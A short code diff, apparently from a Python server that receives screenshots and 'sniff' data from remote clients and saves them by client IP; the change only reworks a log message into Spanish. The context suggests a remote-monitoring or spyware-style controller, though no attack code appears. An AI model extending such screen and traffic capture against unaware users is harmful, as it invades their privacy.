@@ -583,7 +583,7 @@ class ServerApp:
                         with open(path, "wb") as f:
                             f.write(payload)
                         kb = len(payload) / 1024
-                        self._log(f"📷 Screenshot: {fname} ({kb:.1f} KB)", "screenshot")
+                        self._log(f"📷 [{client_ip}] Nueva captura: {fname} ({kb:.1f} KB)", "screenshot")
 
                     elif msg_type == "sniff":
                         fname = header.get("filename", f"sniff_{client_ip}_{ts}.txt")
